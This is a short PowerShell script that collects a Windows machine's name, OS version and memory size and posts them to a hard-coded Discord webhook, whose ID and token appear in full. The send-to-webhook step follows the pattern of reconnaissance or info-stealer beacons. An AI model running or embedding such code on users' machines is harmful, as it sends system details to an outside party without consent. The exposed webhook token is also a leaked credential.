# Define the webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1328711859490127965/4ml3eBzezc1vNd7ZDEV_T2fw8S2GFAyg3W5zpacjz43MC3l1MA0TZOI57ncd5iCJlIeF"

# Gather the required system information
$computerName = $env:COMPUTERNAME
$osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$memoryGB = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

# Create the message payload
$payload = @{
    content = "System Information:"
    embeds = @(
        @{
            title = "Basic System Details"
            fields = @(
                @{
                    name = "Computer Name"
                    value = $computerName
                },
                @{
                    name = "OS Version"
                    value = $osVersion
                },
                @{
                    name = "Total Memory"
                    value = "$memoryGB GB"
                }
            )
        }
    )
} | ConvertTo-Json -Depth 10

# Send the system information payload to the Discord webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    Write-Host "Basic system information sent successfully!"
} catch {
    Write-Host "Failed to send system information: $_"
}
